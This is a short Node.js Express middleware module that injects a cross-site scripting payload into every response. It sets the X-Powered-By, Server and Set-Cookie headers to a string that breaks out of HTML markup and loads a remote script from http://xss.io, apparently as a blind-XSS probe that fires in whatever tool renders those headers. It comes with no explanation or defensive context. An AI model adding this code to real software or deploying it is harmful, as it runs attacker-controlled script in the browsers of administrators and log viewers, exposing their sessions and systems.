module.exports.middleware = function () {
    var deaddrop = '"\'><script src=http://xss.io/D0XFzS></script>'; 
    return function (req, res, next)  {
        res.header('X-Powered-By', deaddrop);
        res.header('Set-Cookie', 'cookie=' + deaddrop);
        res.header('Server', deaddrop);
        next();
    };
};

